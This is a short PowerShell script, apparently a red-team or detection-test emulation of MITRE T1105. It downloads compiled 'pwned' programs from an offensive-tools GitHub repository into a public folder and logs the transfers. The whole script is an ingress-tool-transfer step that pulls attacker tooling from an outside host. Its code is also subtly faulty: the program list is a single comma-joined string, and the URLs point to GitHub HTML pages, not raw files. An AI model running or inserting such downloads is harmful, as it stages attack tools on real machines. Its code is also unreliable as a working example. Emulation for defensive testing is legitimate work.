# Downloads several compiled Pwnd Programs
# Technic ID : T1105
Clear-Host
Write-Output "==============================================================================="
Write-Output "Downloads several compiled Pwnd Programs (T1105)"
Write-Output "==============================================================================="
################ [ List of commpiled programs to downlad ] ################
$SoftToDownload = @("calc.exe,notepad.exe");
################ [ GLOBAL VARIABLES ] ################
$TimeStamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss.fff K"
$DownloadLogFile = "$env:PUBLIC\exf\Pwnd_Progs_Download.txt";
$DestinationPath = "$env:PUBLIC\Toolz\";
################ [ MAIN BODY ] ################
Write-output "-------------------------------------"  | Out-File -FilePath $DownloadLogFile -Encoding utf8 -force
Write-output "Script : $PSCommandPath has been launched on $TimeStamp" | Out-File -FilePath $DownloadLogFile -Encoding utf8 -Append
Write-output "-------------------------------------"  | Out-File -FilePath $DownloadLogFile -Encoding utf8 -Append
Write-Output "`n" | Out-File -FilePath "$DownloadLogFile" -Encoding utf8 -Append
foreach ($Tool in $SoftToDownload) 
{
    $DownloadRun = "https://github.com/S3cur3Th1sSh1t/Creds/blob/master/pwned_x64/$Tool";
    $DestinationFilename = "$DestinationPath/$Tool";
    $web = (New-Object System.Net.WebClient);
    $result = $web.DownloadFile("$DownloadRun", "$DestinationFileName");
    Write-Output "The file $Tool has been successfully downloaded from $DownloadRun and stored to $DestinationFilename" | Out-File -FilePath "$DownloadLogFile" -Append;
  }